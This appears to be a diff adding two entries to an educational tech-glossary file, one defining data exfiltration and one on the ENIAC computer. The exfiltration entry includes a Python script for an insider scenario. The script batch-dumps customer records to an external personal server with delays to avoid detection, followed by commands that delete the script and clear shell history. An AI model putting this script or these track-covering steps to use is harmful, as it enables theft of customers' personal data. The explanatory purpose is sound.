@@ -1324,3 +1324,256 @@ Architecture: S2 Geometry + Geohash
 ```
 
 ---
+
+day - 28
+
+## Data Exfiltration
+
+### Definition:
+
+Data Exfiltration is the unauthorized transfer of data from a computer or network to an external location. It's essentially data theft—stealing sensitive information and sending it somewhere it doesn't belong, often without the owner's knowledge.
+
+**Key Characteristics:**
+
+- Unauthorized: Data leaves without permission
+- Covert: Often hidden or disguised as normal traffic
+- Malicious Intent: Goal is to steal valuable information
+- Various Methods: Can be manual (insider) or automated (malware)
+
+Simple Analogy:
+
+```
+🏦 Bank Robbery vs Data Exfiltration:
+
+Physical Robbery:
+Break into bank → Steal money → Leave with bags of cash
+Everyone knows immediately!
+
+Data Exfiltration:
+Break into network → Copy data → Send out quietly
+Nobody notices for months (or ever)!
+
+Key Difference: Data can be copied, not just stolen.
+You still have it, but now the attacker has it too.
+```
+
+### Example:
+
+Scenario: Disgruntled Employee at E-commerce Company
+
+```
+The Setup:
+
+- Employee has access to customer database
+- Planning to leave company and start competing business
+- Wants customer data for head start
+
+The Attack
+Week 1: Reconnaissance
+
+-- Employee checks what data exists
+SELECT COUNT(\*) FROM customers;
+-- Result: 2,000,000 customers
+
+SELECT \* FROM customers LIMIT 5;
+-- Sees: email, name, phone, purchase history, addresses
+Week 2: Exfiltration Begins
+
+# Employee writes innocent-looking script
+
+# Disguised as "analytics tool"
+
+import psycopg2
+import requests
+import time
+
+def "analyze_customer_data"(): # Fake function name # Connect to production database
+conn = psycopg2.connect(
+host="db.company.com",
+database="production",
+user="employee_id_1234",
+password="password123"
+)
+
+    cursor = conn.cursor()
+
+    # Extract all customer data in small batches (stay under radar)
+    batch_size = 1000
+    offset = 0
+
+    while True:
+        # Query looks normal - just selecting data
+        cursor.execute(f"""
+            SELECT email, name, phone, address, purchase_history
+            FROM customers
+            LIMIT {batch_size} OFFSET {offset}
+        """)
+
+        customers = cursor.fetchall()
+
+        if not customers:
+            break
+
+        # Send to personal server (THE EXFILTRATION)
+        # Using HTTPS to hide in normal web traffic
+        requests.post(
+            "https://my-personal-server.com/collect",
+            json={"data": customers},
+            headers={"X-Secret-Key": "abc123"}
+        )
+
+        offset += batch_size
+        time.sleep(30)  # Slow down to avoid detection
+
+    print("Analysis complete!")  # Looks innocent in logs
+
+# Run during lunch break
+
+analyze_customer_data()
+Week 3: Covering Tracks
+
+# Delete script
+
+rm analyze_customer_data.py
+
+# Clear bash history
+
+history -c
+
+# Resign from company
+
+echo "Dear HR, I'm leaving for personal reasons..."
+Detection Timeline
+
+Day 1: Data stolen → No alerts
+Day 30: Employee leaves → No connection made
+Day 60: Competitor launches with stolen customer list
+Day 90: Company investigates: "How did they get our customers?"
+Day 120: Forensic analysis finds the exfiltration
+Day 150: Lawsuit filed, but damage done
+What Was Stolen
+
+┌─────────────────────────────────────────┐
+│ 2 Million Customer Records │
+├─────────────────────────────────────────┤
+│ • Full names │
+│ • Email addresses │
+│ • Phone numbers │
+│ • Home addresses │
+│ • Purchase history ($50M in total) │
+│ • Credit card last 4 digits │
+│ • Preferences and behavior data │
+├─────────────────────────────────────────┤
+│ Total Value: $10M+ (estimated) │
+│ Transferred: 500 MB over 3 weeks │
+│ Detection: 4 months after theft │
+└─────────────────────────────────────────┘
+```
+
+---
+
+day - 29
+
+## Electronic Numerical Integrator and Computer (ENIAC)
+
+### Definition:
+
+ENIAC was the first general-purpose, fully electronic digital computer, completed in 1945 at the University of Pennsylvania. It was built to calculate artillery firing tables for the U.S. Army during World War II. Unlike mechanical computers, ENIAC used vacuum tubes instead of gears and could perform calculations at electronic speeds.
+
+**Key Facts:**
+
+- Built: 1943-1945
+- Purpose: Calculate ballistic trajectories
+- Size: Occupied 1,800 square feet (167 m²)
+- Weight: 30 tons (27,000 kg)
+- Power: 150 kilowatts (enough for 150 homes)
+- Components: 17,468 vacuum tubes, 7,200 crystal diodes, 1,500 relays
+- Speed: 5,000 operations per second (revolutionary for the time!)
+
+Simple Analogy
+
+ENIAC vs Modern Computer:
+
+🏢 ENIAC (1945):
+├─ Size: Entire room (1,800 sq ft)
+├─ Weight: 30 tons (like 6 elephants)
+├─ Power: 150 kW (your whole neighborhood)
+├─ Speed: 5,000 operations/sec
+├─ Memory: 20 numbers
+├─ Programming: Rewire by hand (took days)
+└─ Cost: $487,000 (1945) = $8 million today
+
+📱 Your Smartphone (2024):
+├─ Size: Fits in pocket
+├─ Weight: 200 grams (less than 0.5 lbs)
+├─ Power: 5 watts (like a night light)
+├─ Speed: 1 trillion operations/sec (200 million times faster!)
+├─ Memory: Billions of numbers
+├─ Programming: Download apps instantly
+└─ Cost: $1,000
+
+Your phone is 200,000,000× faster and fits in your pocket!
+
+### Example:
+
+Calculating a Trajectory
+The Problem
+Artillery Question:
+"If I fire a shell at 45° angle with velocity 500 m/s, where does it land?"
+
+```
+Manual Calculation (1943)
+
+Human "Computer" Process:
+
+Hour 1-2: Set up equations
+├─ Write out ballistic formulas
+├─ Account for air resistance
+├─ Factor in wind
+└─ Include Earth's rotation
+
+Hour 3-10: Numerical integration
+├─ Divide trajectory into 100 time steps
+├─ Calculate position at each step
+├─ Use mechanical calculator for each multiplication
+│   (Each multiplication: 30 seconds)
+│   (Each division: 1 minute)
+└─ 100 steps × 20 operations each = 2,000 calculations
+
+Hour 11-20: Check work
+├─ Verify calculations
+├─ Re-do any errors
+└─ Plot results on graph
+
+Hour 21-30: Create firing table entry
+├─ Format results
+├─ Add to master table
+└─ Document assumptions
+
+Total Time: 30-40 hours
+Error Rate: 2-5% (human mistakes)
+ENIAC Calculation (1946)
+
+ENIAC Process:
+
+Week 1: Program ENIAC (one-time setup)
+├─ Design calculation flow
+├─ Wire panels for ballistic equations
+├─ Connect function tables
+└─ Test configuration
+
+Day 1 (after setup): Run calculations
+├─ Input: velocity, angle, environmental factors
+├─ ENIAC divides trajectory into 100 steps
+├─ Calculates position at each step
+│   (Each calculation: 0.0002 seconds)
+│   (100 steps × 20 operations = 0.4 seconds)
+├─ Output: Complete trajectory
+└─ Punch results to cards
+
+Total Time: 30 SECONDS per trajectory
+Error Rate: 0% (if programmed correctly)
+Speed Improvement: 3,600× FASTER than humans
+```
+
+---
